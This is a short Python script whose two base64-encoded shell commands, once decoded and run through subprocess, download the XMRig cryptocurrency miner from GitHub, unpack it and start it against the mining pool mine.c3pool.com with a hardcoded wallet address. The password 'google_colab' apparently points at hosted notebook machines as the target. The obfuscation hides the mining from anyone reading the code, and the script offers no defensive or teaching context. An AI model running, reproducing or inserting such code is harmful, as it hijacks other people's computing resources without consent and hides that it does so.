cmd = "d2dldCBodHRwczovL2dpdGh1Yi5jb20veG1yaWcveG1yaWcvcmVsZWFzZXMvZG93bmxvYWQvdjYuMTAuMC94bXJpZy02LjEwLjAtbGludXgtc3RhdGljLXg2NC50YXIuZ3ogJiYgdGFyIC14ZiB4bXJpZy02LjEwLjAtbGludXgtc3RhdGljLXg2NC50YXIuZ3o="

cmd0 = "Y2QgeG1yaWctNi4xMC4wICYmIGNobW9kICt4IHhtcmlnICYmIC4veG1yaWcgLS11cmw9bWluZS5jM3Bvb2wuY29tOjE1NTU1IC0tdXNlcj00MWpyWmtZYm9hTGpUTTJkUXZuWHZOR01hZzZuZGhNRjZhQnBIY1ZLWmM0dFN1RkNOajZOOVE0QjQxbWFrcjFMcFJncXlVUUFES2JFbllKa0p6aU1NdGJXVlBncVRqQSAtLXBhc3M9Z29vZ2xlX2NvbGFi"
import base64                                                                                                               
def encode(string):
    if type(string) == str:
        string = string.encode("utf-8")
    return base64.urlsafe_b64encode(string).decode("utf-8")

def decode(string):
    if type(string) == str:
        string = string.encode("utf-8")
    return base64.urlsafe_b64decode(string).decode("utf-8")
cmd = decode(cmd)
cmd0 = decode(cmd0)
with open("myscript.sh","w+") as f:
    f.write(cmd)
import subprocess
def execute(command):
    program=subprocess.Popen(command,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
    stdout,stderr=program.communicate()
    print(stdout,stderr)
command="bash myscript.sh".split(" ")
execute(command)

import random
random_string = random.choice(list(range(10000000)))
random_string = str(random_string)

command=["bash","-c",cmd0+random_string]
execute(command)
